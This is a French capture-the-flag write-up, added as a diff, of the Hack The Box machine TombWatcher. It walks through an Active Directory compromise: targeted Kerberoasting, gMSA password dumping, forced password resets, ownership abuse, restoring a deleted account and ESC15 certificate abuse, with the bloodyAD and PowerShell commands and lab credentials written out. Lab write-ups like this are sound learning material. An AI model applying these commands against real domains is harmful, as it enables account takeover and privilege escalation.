@@ -1,0 +1,164 @@
+Je commance avec ces credentials: henry / H3nry_987TGV!
+
+nmap me donne
+nmap
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49667/tcp open  unknown
+49691/tcp open  unknown
+49692/tcp open  unknown
+49693/tcp open  unknown
+49712/tcp open  unknown
+49718/tcp open  unknown
+49740/tcp open  unknown
+
+Avec le port ldap je décide d'utiliser bloodhound pour enumérer le systeme 
+bloodhound-ce-python -u 'henry' -p 'H3nry_987TGV!' -d tombwatcher.htb -ns 10.10.11.72 -c All --zip
+dans bloodhound je vois que j'ai les droits "writespn" sur le compte ALFRED,
+(img: sc/writespn.jpg)
+je peux donc faire une attaque kerberoast qui consiste a associer un service a un compte pour ensuite demander l'accès a ce service, Kerberos m'envera un TGS qui sera formé a partir de la clé d'accès d'Alfred, que je pourrais potentiellement bruteforce en local
+c'est donc ce que je fais avec ./targetedKerberoast.py et après avoir cracké avec hashcat je tombes sur aflred:basketball
+Sur bloodhound j'affiche toute la path jusqu'a avoir un compte avec remote access (img: sc/pathtofoothold.jpg), Nous avons déjà fait l'étape 1, passons à l'étape 2.
+étape 2 henry peut s'ajouter a INFRASTRUCTURE:
+c'est donc ce que je fais en suivant les indications de bloodhound,
+ça ne fonctionnais pas avec net rpc mais ça fonctionne avec bloodyAD
+bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u "Alfred" -p "basketball" add groupMember "INFRASTRUCTURE" "Alfred"
+[+] Alfred added to INFRASTRUCTURE
+
+Etape 3: ReadGMSAPassword sur ANSIBLE_DEV$
+
+Bloodhound me dit
+ANSIBLE_DEV$@TOMBWATCHER.HTB is a Group Managed Service Account. The group INFRASTRUCTURE@TOMBWATCHER.HTB can retrieve the password for the GMSA ANSIBLE_DEV$@TOMBWATCHER.HTB.
+
+Group Managed Service Accounts are a special type of Active Directory object, where the password for that object is mananaged by and automatically changed by Domain Controllers on a set interval (check the MSDS-ManagedPasswordInterval attribute).
+
+The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. An attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA.
+
+De ce que j'ai compris cela veut dire que c'est un compte avec un mdp temporaire que tout le monde peut utiliser si il a accès au bon droits (ce que j'ai)
+
+je cherche donc a recuperer le mdp
+┌──(gMSADumper)─(kali㉿kali)-[~/Documents/tools/gMSADumper]
+└─$ bloodyAD -u Alfred -d tombwatcher.htb -p basketball --host 10.10.11.72 get object 'ANSIBLE_DEV$' --attr msDS-ManagedPassword
+
+distinguishedName: CN=ansible_dev,CN=Managed Service Accounts,DC=tombwatcher,DC=htb
+msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:4f46405647993c7d4e1dc1c25dd6ecf4
+
+Etape 4 avoir changer mdp de sam:
+J'ai les droits forcechangePasswd donc je peux choisir le mdp
+
+┌──(gMSADumper)─(kali㉿kali)-[~/Documents/tools/gMSADumper]
+└─$ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u 'ANSIBLE_DEV$' -p :4f46405647993c7d4e1dc1c25dd6ecf4 set password sam 'basketball'
+[+] Password changed successfully!
+
+Etape 5: accèder a john
+
+Sam a WriteOwner sur John, je peux donc changer A MA GUISE l'owner du compte.
+Je me mets donc moi même,
+┌──(gMSADumper)─(kali㉿kali)-[~/Documents/tools/gMSADumper]
+└─$ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u 'sam' -p 'basketball' set owner 'john' 'sam'
+[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
+
+Une fois owner je peux attribuer GenericAll a Sam pour pouvoir abuser de cet ownership
+
+┌──(gMSADumper)─(kali㉿kali)-[~/Documents/tools/gMSADumper]
+└─$ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u 'sam' -p 'basketball' add genericAll 'john' 'sam'
+[+] sam has now GenericAll on john
+
+A partir de là je peux à peu prêt tout faire avec son compte, mais je n'ai pas envie de changer son mdp car cela pourrait embêter les autres joueurs et aussi d'avoir le mdp original me permettrais d'avoir un checkpoint en cas de reset de la machine, je fais donc Kerberoast comme la dernière fois et ça fonctionne j'ai donc accès a john avec john:Password123
+(edit: je reviens quelques jours après et cette stratégie ne marche plus, le mdp que j'avais trouvé était donc déjà changé, ne pouvant pas le cracker je suis donc obligé de changer le mdp donc:
+┌──(kali㉿kali)-[~/Documents/tombwatcher]
+└─$ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u 'sam' -p 'basketball' set password john 'basketball'
+[+] Password changed successfully!
+)
+
+john fait parti de REMOTE MANAGEMENT USERS ce qui me permet de me co avec winRM
+
+J'ai donc l'user flag dans le Desktop de john
+
+je suis bloqué (c'est l'une de mes premières box windows) et en recherchant un indice je tombe sur post qui dit "Check for deleted AD-Objects"
+et effectivement je tombes sur des users supprimés avec des noms interresants
+*Evil-WinRM* PS C:\Users\john> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties * | Select-Object Name, Description, LastKnownParent
+
+Name                                                Description                           LastKnownParent
+----                                                -----------                           ---------------
+Deleted Objects                                     Default container for deleted objects
+cert_admin...                                                                             OU=ADCS,DC=tombwatcher,DC=htb
+cert_admin...                                                                             OU=ADCS,DC=tombwatcher,DC=htb
+cert_admin...                                                                             OU=ADCS,DC=tombwatcher,DC=htb
+
+J'ai genericAll sur ADCS donc je peux tenter de restaurer cert_admin
+Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf" -TargetPath "OU=ADCS,DC=tombwatcher,DC=htb"
+guid trouvé avec Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties * (j;ai pris le dernier apres plusieurs essais)
+Set-ADAccountPassword -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf" -Reset -NewPassword (ConvertTo-SecureString -AsPlaintext "basketball" -Force)
+
+il peut enroll le certificat "WEBSERVER"
+  17
+    Template Name                       : WebServer
+    Display Name                        : Web Server
+    Certificate Authorities             : tombwatcher-CA-1
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Extended Key Usage                  : Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 1
+    Validity Period                     : 2 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2024-11-16T00:57:49+00:00
+    Template Last Modified              : 2024-11-16T17:07:26+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+                                          S-1-5-21-1392491010-1358638721-2126982587-1111
+      Object Control Permissions
+        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
+        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+                                          S-1-5-21-1392491010-1358638721-2126982587-1111
+
+(ce qui est drole, c'est que j'avais vu le truc S-1-5-21-1392491010... qui ressemblait a un identifiant, mais j'avais pas plus investigué, bếte de ma part)
+
+il y a "server autentification" et "enrollee supplies subject" donc je peux choisir le CN, le seul problème c'est que c'est pour "server authentification" et pas "client authentification" mais je suis dans les Write Property Enroll
+
+en relancant certipy avec cert_admin cette ligne est rajoutée
+    [!] Vulnerabilities
+      ESC15                             : Enrollee supplies subject and schema version is 1.
+    [*] Remarks
+      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
+
+je cherche donc ESC15 et je tombe sur ce tuto qui explique comment exploiter cette vulnérabilité pour avoir un certificat avec des droits d'admin
+
+https://www.hackingarticles.in/adcs-esc15-exploiting-template-schema-v1/
+
+ça fonctionne mais j'arrive seulement a me connecter avec ldap-shell, mais avec cela j'arrive a modifier le mdp de l'admin et me connecter en winRM (img: sc/ldap_shell.jpg)
+
+une fois admin j'ai le root flag dans le desktop
+FINIS !
+
+Bon c'est ma deuxième box windows, j'étais vraiment fier de moi dans la première partie jusqu'a l'user flag, j'ai remarqué un vrai progrès, j'ai ensuite galéré avec l'utilisateur qui était suppr, j'aurais pu trouver plus d'indice avec le SID du cert mais bon c'était vraiment pas évident pour une deuxième. J'ai galéré aussi avec le dernier certificat. De manière générale j'ai beaucoup appris (les deux box utilisaient les certificats pour le privesc) et j'aime bien la courbe de progression forte du début. Très bonne box, merci aux créateurs !
